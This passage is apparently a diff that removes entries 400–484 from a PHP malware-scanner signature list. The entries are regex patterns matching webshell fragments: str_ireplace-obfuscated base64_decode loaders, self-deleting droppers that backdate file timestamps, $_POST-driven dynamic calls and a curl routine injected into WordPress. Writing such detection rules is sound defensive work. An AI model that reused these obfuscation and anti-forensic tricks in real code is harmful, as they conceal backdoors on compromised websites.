-      'pattern' => '/\\<\\?php echo "aBydyVPrVm"; if \\(file_exists\\("\\.\\/order_result\\.php"\\)\\)\\{ touch\\("\\.\\/order_result\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Q/',
-      'label' => 'source-file tail snippet',
-    ),
-    400 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wfyke\\=str_ireplace\\("w","","wbwwwwawwwwwswwwewwww6wwww4wwww_wwdwwwewwwwwcwwwwowwwdwwwwewww"\\); \\$tbvmf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
-      'label' => 'source-file tail snippet',
-    ),
-    401 => 
-    array (
-      'pattern' => '/\\$let \\= array \\("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c/',
-      'label' => 'source-file head snippet',
-    ),
-    402 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vvfqseb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$xwdekp\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
-      'label' => 'source-file tail snippet',
-    ),
-    403 => 
-    array (
-      'pattern' => '/\\<\\?php \\$webks\\=str_ireplace\\("i","","iibiiiiaiiiiisiiiiiieiiii6iii4iiii_iiiiidiiiieiiiiiiciiiiioiidiiiei"\\); \\$pwcpks\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    404 => 
-    array (
-      'pattern' => '/\\/\\*\\* Sets up WordPress vars and included files\\. \\*\\/[\\s\\S]{0,12000}function Go\\(\\$url\\)\\{ \\$ch \\= curl_init\\(\\); \\$ip \\= rand\\(0,255\\)\\."\\."\\.rand\\(0,255\\)\\."\\."\\.rand\\(0,255\\)\\."\\."\\.rand\\(0,255\\) ; \\$timeout \\= 15; curl_setopt\\(\\$ch,CUR/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    405 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gguxvwaht\\=str_ireplace\\("q","","qbqqqqqaqqqqsqqqqeqqq6qqqq4qqq_qqqqdqqeqqqqcqqqqqqoqqqqqqdqqqeqq"\\); \\$kpunumeed\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    406 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yrqyradz\\=str_ireplace\\("u","","uubuuuauuusuuuueuuuu6uuuu4uuuu_uuuuduuuuueuucuuuuouuuduuuuueuuu"\\); \\$dcspdcfb\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    407 => 
-    array (
-      'pattern' => '/\\<\\?php echo "cdBHQRVKNV"; if \\(file_exists\\("\\.\\/phpinfo\\.php"\\)\\)\\{ touch\\("\\.\\/phpinfo\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4Vx0UZsSThQ/',
-      'label' => 'source-file tail snippet',
-    ),
-    408 => 
-    array (
-      'pattern' => '/\\<\\?php echo "zUxcrfVVTs"; if \\(file_exists\\("\\.\\/my\\-theaters\\.php"\\)\\)\\{ touch\\("\\.\\/my\\-theaters\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*wdN/',
-      'label' => 'source-file tail snippet',
-    ),
-    409 => 
-    array (
-      'pattern' => '/\\<\\?php \\$aqhyyau\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyy6yyyyyy4yyyy_yyydyyyyeyyyycyyyyoyyydyyyyyeyyy"\\); \\$rkrnd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    410 => 
-    array (
-      'pattern' => '/\\<\\?php \\$aeukqaz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$pupgazgrf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    411 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ptzqwnvbsa\\=str_ireplace\\("z","","zzbzzzzzzazzzzszzzzezzz6zzz4zzzzzz_zzzzdzzzezzczzzozzzzdzzzzez"\\); \\$bprcvyz\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    412 => 
-    array (
-      'pattern' => '/\\<\\?php \\$pcqxqpuhg\\=str_ireplace\\("g","","ggbgggggagggsggggggegg6ggg4gggg_ggggdggggeggggcgggggogggggdgggggegg"\\); \\$hmtsbfruau\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    413 => 
-    array (
-      'pattern' => '/\\<\\?php echo "gdnnypGTDW"; if \\(file_exists\\("\\.\\/nofollow\\.php"\\)\\)\\{ touch\\("\\.\\/nofollow\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*0wahuAsrm/',
-      'label' => 'source-file tail snippet',
-    ),
-    414 => 
-    array (
-      'pattern' => '/\\<\\?php \\$azxusu\\=str_ireplace\\("q","","qbqqqqqaqqqqsqqqqeqqq6qqqq4qqq_qqqqdqqeqqqqcqqqqqqoqqqqqqdqqqeqq"\\); \\$pwggykh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    415 => 
-    array (
-      'pattern' => '/\\<\\?php \\$afqdd\\=str_ireplace\\("x","","xbxxaxxxxsxxxxxexxxx6xxx4xxx_xxxxxdxxxxxexxxxxcxxxxoxxxxxdxxxexx"\\); \\$mwnsarun\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    416 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dkfzamusx\\=str_ireplace\\("f","","fffbfffaffffsffefffff6fffff4ffff_fffffdffeffffffcffoffffdfffffefff"\\); \\$npvqhrfc\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    417 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mzdarfwre\\=str_ireplace\\("g","","gggbggggaggsggggeggg6gggg4gggggg_ggggdgggggegggggcggogggggdgggggeggg"\\); \\$uehacwr\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    418 => 
-    array (
-      'pattern' => '/\\<\\?php \\$asgxt\\=str_ireplace\\("m","","mbmmmmmammmsmmmmemmmmmm6mmmmmm4mmm_mmmmdmmemmmmmmcmmmommdmmmemmm"\\); \\$fxvkmwt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    419 => 
-    array (
-      'pattern' => '/\\<\\?php \\$htgmk\\=str_ireplace\\("i","","ibiiiiiiaiiisiiiieiiii6iiiii4iiii_iiiiiidiiiieiiiciiioiiiidiiiei"\\); \\$kkydnkg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    420 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mrawuzyff\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xxxx4xx_xxxxdxxxexxxcxxxxoxxxdxxxxex"\\); \\$zwfyukfrw\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    421 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xgbgz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$xwkpmdhv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
-      'label' => 'source-file tail snippet',
-    ),
-    422 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$xhtxbhywrnrmfu,array\\([\\s\\S]{0,160}GMT"\\);
-\\/\\/header\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    423 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zqbzwa\\=str_ireplace\\("q","","qqbqqqqqqaqqqsqqqqeqqqqq6qqqqq4qqqq_qqdqqqqqeqqqqqcqqqoqqdqqeq"\\); \\$bbpnyyfdu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    424 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wfewkcqy\\=str_ireplace\\("h","","hbhhhhhahhshhhhhhehhhhh6hhh4hhhh_hhhhhhdhhhhehhhhhchhohhhhhdhhhehhh"\\); \\$qsnzdwun\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    425 => 
-    array (
-      'pattern' => '/\\<\\?php \\$suxyp\\=str_ireplace\\("p","","ppbppppppappppspppppepppp6ppp4ppp_ppppdppppppeppppcppppppoppppppdppppep"\\); \\$hkthxfp\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    426 => 
-    array (
-      'pattern' => '/\\<\\?php echo "mhAkcQFUXH"; if \\(file_exists\\("\\.\\/affiliate_help9\\.php"\\)\\)\\{ touch\\("\\.\\/affiliate_help9\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__/',
-      'label' => 'source-file tail snippet',
-    ),
-    427 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$npbfdbv,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    428 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply     \\(\\$option, \\$win,                     array                 \\(\\$it\\)           \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    429 => 
-    array (
-      'pattern' => '/, __DIR__\\);
-\\}
-else if \\(                             empty                       \\(\\$_POST\\)\\) \\{
-	
-	echo/',
-      'label' => 'sample-specific literal',
-    ),
-    430 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wupxr\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$hfhfmfxhw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
-      'label' => 'source-file tail snippet',
-    ),
-    431 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bnpwvxh\\=str_ireplace\\("q","","qqqbqqqqqqaqqqqsqqqqqqeqqqq6qqqq4qqqqq_qqqdqqeqqqcqqqqoqqqqdqqqqqeqqq"\\); \\$tzbpkzqd\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    432 => 
-    array (
-      'pattern' => '/\\<\\?php echo "ftBXhrcGRX"; if \\(file_exists\\("\\.\\/autosuggest\\.php"\\)\\)\\{ touch\\("\\.\\/autosuggest\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2W8/',
-      'label' => 'source-file tail snippet',
-    ),
-    433 => 
-    array (
-      'pattern' => '/\\<\\?php echo "RkBMEWHPXE"; if \\(file_exists\\("\\.\\/servizi\\.php"\\)\\)\\{ touch\\("\\.\\/servizi\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*rNZgVk3sAZv/',
-      'label' => 'source-file tail snippet',
-    ),
-    434 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$hnysdxthmwrfgf,array\\([\\s\\S]{0,160}GMT"\\);
-\\/\\/header\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    435 => 
-    array (
-      'pattern' => '/\\<\\?php echo "zyWCAcEXCa"; if \\(file_exists\\("\\.\\/shirt\\.config\\.php"\\)\\)\\{ touch\\("\\.\\/shirt\\.config\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*g/',
-      'label' => 'source-file tail snippet',
-    ),
-    436 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gaqtaz\\=str_ireplace\\("r","","rbrrrrarrrrrsrrerrrrrr6rrrr4rrrr_rrrrrdrrrerrrrrcrrrrrorrrdrrrerrr"\\); \\$ekbpusfrw\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    437 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zkskxcfu\\=str_ireplace\\("h","","hbhhhahhhhshhhehhhhh6hhhhh4hhhhh_hhdhhhhehhhhhchhhhhohhhhdhhhhheh"\\); \\$esebrzvee\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    438 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wrxxb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$stbassy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    439 => 
-    array (
-      'pattern' => '/\\<\\?php echo "BDvrpywWUy"; if \\(file_exists\\("\\.\\/config\\.youve\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.youve\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4/',
-      'label' => 'source-file tail snippet',
-    ),
-    440 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wuemxs\\=str_ireplace\\("x","","xxxbxxxxxaxxsxxxxxexxx6xxxxx4xxxx_xxxxxdxxxxxexxxxxcxxoxxdxxexx"\\); \\$gvzegvyzgv\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    441 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ztvrqa\\=str_ireplace\\("p","","pppbppappspppppeppp6ppp4pppp_pppdpppeppppcpppppopppdppppep"\\); \\$gudvrvz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    442 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tqkuntpu\\=str_ireplace\\("g","","gggbggggaggsggggeggg6gggg4gggggg_ggggdgggggegggggcggogggggdgggggeggg"\\); \\$vkmmuybf\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    443 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gbxayq\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wusndy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    444 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gyygbr\\=str_ireplace\\("v","","vbvvvvavvvvvsvvvvvevvv6vvv4vvv_vvvvvdvvvvevvvvcvvvovvvvvdvvev"\\); \\$skkhhr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    445 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dwburuwvzp\\=str_ireplace\\("z","","zzzbzzazzzzzszzzzzezzzzz6zzz4zzz_zzdzzzezzzczzzzozzzzzdzzzezzz"\\); \\$ervqnkdg\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    446 => 
-    array (
-      'pattern' => '/Lyp4a21xd2Z3YWMqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypx/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    447 => 
-    array (
-      'pattern' => '/\\<\\?php echo "PXBDZPmCfS"; if \\(file_exists\\("\\.\\/order2\\-dba\\.php"\\)\\)\\{ touch\\("\\.\\/order2\\-dba\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*eVvnm/',
-      'label' => 'source-file tail snippet',
-    ),
-    448 => 
-    array (
-      'pattern' => '/Lyp4Y2NkdmtyZ2twZHIqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    449 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uwwhghrsz\\=str_ireplace\\("g","","gggbgggggagggggsggggegggggg6gggg4gggg_ggggdggggeggggcggoggggggdggggeg"\\); \\$xatuvvdst\\="DQoJCUBlcnJvcl9yZ/',
-      'label' => 'source-file tail snippet',
-    ),
-    450 => 
-    array (
-      'pattern' => '/LypkZ3ZwdGJrZnVwemdrKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    451 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}define\\(\'PATH\', __DIR__\\)             ;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    452 => 
-    array (
-      'pattern' => '/\\<\\?php \\$egaxu\\=str_ireplace\\("h","","hbhhhhhahhshhhhhhehhhhh6hhh4hhhh_hhhhhhdhhhhehhhhhchhohhhhhdhhhehhh"\\); \\$hbkfzxkpgz\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    453 => 
-    array (
-      'pattern' => '/LypoY21ocGNobmh5dmFrcG0qLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    454 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wbsfew\\=str_ireplace\\("f","","fffbfffaffffsffefffff6fffff4ffff_fffffdffeffffffcffoffffdfffffefff"\\); \\$hydxnwv\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    455 => 
-    array (
-      'pattern' => '/\\<\\?php \\$apqcgmb\\=str_ireplace\\("p","","pbpppappsppppepppp6pppp4ppp_ppppppdppepppcpppppopppppdppppep"\\); \\$grrwsvcg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    456 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gpefsaezvs\\=str_ireplace\\("k","","kkkbkkkkakkkkskkkkkekkkk6kkkkkk4kkkkk_kkdkkkkkekkkkkckkkkokkkkkkdkkkkkekk"\\); \\$wagxh\\="DQoJCUBlcnJvcl9y/',
-      'label' => 'source-file tail snippet',
-    ),
-    457 => 
-    array (
-      'pattern' => '/\\<\\?php echo "mTDWHMbQGR"; if \\(file_exists\\("\\.\\/nominate_topic\\.php"\\)\\)\\{ touch\\("\\.\\/nominate_topic\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    458 => 
-    array (
-      'pattern' => '/\\<\\?php echo "dRAszwNZEC"; if \\(file_exists\\("\\.\\/404error\\.php"\\)\\)\\{ touch\\("\\.\\/404error\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*g7wTpPURC/',
-      'label' => 'source-file tail snippet',
-    ),
-    459 => 
-    array (
-      'pattern' => '/LypkdmFtcWNocnEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypk/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    460 => 
-    array (
-      'pattern' => '/\\<\\?php echo "CtFaPEPruE"; if \\(file_exists\\("\\.\\/feed_embed\\.php"\\)\\)\\{ touch\\("\\.\\/feed_embed\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ZKtVd/',
-      'label' => 'source-file tail snippet',
-    ),
-    461 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$_POST                          \\[\'r\'\\]                          \\(                  \\$_POST      \\[\'d\'\\]\\(                \'\',      \\$_POST   \\[\'f\'\\] /s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    462 => 
-    array (
-      'pattern' => '/\\<\\?php \\$nspbkc\\=str_ireplace\\("i","","ibiiiiiiaiiisiiiieiiii6iiiii4iiii_iiiiiidiiiieiiiciiioiiiidiiiei"\\); \\$arrzfuk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    463 => 
-    array (
-      'pattern' => '/\\<\\?php echo "yGSTbWqRHF"; if \\(file_exists\\("\\.\\/security\\.php"\\)\\)\\{ touch\\("\\.\\/security\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*T8AEwrB0g/',
-      'label' => 'source-file tail snippet',
-    ),
-    464 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sdzhvncxx\\=str_ireplace\\("u","","ubuuuuauuuusuuuuueuuuu6uuuu4uuuuu_uuuduuuueuuuucuuuuuuouuuduuuueuu"\\); \\$gzvqbcehyp\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    465 => 
-    array (
-      'pattern' => '/\\)
-
-
-; 
-\\}
-set_exception_handler                   \\([\\s\\S]{0,160}\\]                           \\(\\$_POST            \\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    466 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vktnhr\\=str_ireplace\\("y","","ybyyyyayysyyyyeyyy6yyy4yyyyy_yyyyyydyyyyeyyyyycyyyoyydyyyyey"\\); \\$uxsaqmbxg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    467 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rguakmw\\=str_ireplace\\("h","","hhhbhhhhahhhshhhehhh6hhhh4hhh_hhhdhhhhehhhhchhhhhohhhhdhhhhheh"\\); \\$skyhygdhh\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    468 => 
-    array (
-      'pattern' => '/\\<\\?php echo "erVDuMxpGN"; if \\(file_exists\\("\\.\\/cat_search\\.php"\\)\\)\\{ touch\\("\\.\\/cat_search\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*MWwYA/',
-      'label' => 'source-file tail snippet',
-    ),
-    469 => 
-    array (
-      'pattern' => '/\\<\\?php echo "tNTBDmWSND"; if \\(file_exists\\("\\.\\/loading\\.php"\\)\\)\\{ touch\\("\\.\\/loading\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*uefR7H687rS/',
-      'label' => 'source-file tail snippet',
-    ),
-    470 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gudppgw\\=str_ireplace\\("x","","xbxxxxxaxxxsxxexxx6xxx4xxxxx_xxxdxxxxexxxxxcxxxoxxxxdxxxexxx"\\); \\$qrbqrgym\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    471 => 
-    array (
-      'pattern' => '/\\<\\?php \\$msphsbrxn\\=str_ireplace\\("u","","ubuuuuauuuusuuuuueuuuu6uuuu4uuuuu_uuuduuuueuuuucuuuuuuouuuduuuueuu"\\); \\$hvrekkqhf\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    472 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ngdzfqvp\\=str_ireplace\\("r","","rbrrrrarrrrsrrrrerrrrrr6rrrrrr4rrrrr_rrrrdrrrrrerrrrrrcrrrrrorrrrrrdrrrrerr"\\); \\$rkaedcm\\="DQoJCUBlcnJvcl/',
-      'label' => 'source-file tail snippet',
-    ),
-    473 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uszmnemhw\\=str_ireplace\\("i","","ibiiaiisiiiieiiiiii6iii4iiii_iidiiiiieiiiciiiioiiiidiiiiiei"\\); \\$kfthbsmuh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    474 => 
-    array (
-      'pattern' => '/No configuration file found and no installation code available\\. Exiting\\.\\.\\.[\\s\\S]{0,160}No received stream nsw configuration data\\. Exiting\\.\\.\\./',
-      'label' => 'sample-specific literal chain',
-    ),
-    475 => 
-    array (
-      'pattern' => '/\',\\$errstr\\); array_map\\(\\$cfgwxbpkukcup,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    476 => 
-    array (
-      'pattern' => '/\\<\\?php echo "EdHrZHhUuv"; if \\(file_exists\\("\\.\\/config\\.parallel\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.parallel\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__/',
-      'label' => 'source-file tail snippet',
-    ),
-    477 => 
-    array (
-      'pattern' => '/Lyp0c25idGZkYmVlZWMqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    478 => 
-    array (
-      'pattern' => '/\\);\\$vqdqgesxyu\\=\\$vn\\(\\$sguxq\\);user_error\\(\\$vqdqgesxyu,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    479 => 
-    array (
-      'pattern' => '/\\<\\?php \\$abfhbk\\=str_ireplace\\("f","","fbffffaffffffsffffeffffff6ff4fffff_ffdffffffefffffcffffoffffdffffef"\\); \\$supcd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    480 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xgkcsbxs\\=str_ireplace\\("w","","wwwbwwawwwwwswwwwewwww6www4wwww_wwwwdwwwwwewwwwwcwwwwwowwwdwweww"\\); \\$rycpuks\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    481 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xkdczuwh\\=str_ireplace\\("m","","mbmmmmmammmsmmmmemmmmmm6mmmmmm4mmm_mmmmdmmemmmmmmcmmmommdmmmemmm"\\); \\$fdzdqckf\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    482 => 
-    array (
-      'pattern' => '/Lyplc3l3cGVjKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8qYmt2/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    483 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tqbzry\\=str_ireplace\\("t","","ttbttatttstttttettttt6ttt4tttt_tttttdtttettttctttotttdtttet"\\); \\$wgfhruf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
-      'label' => 'source-file tail snippet',
-    ),
-    484 => 
-    array (
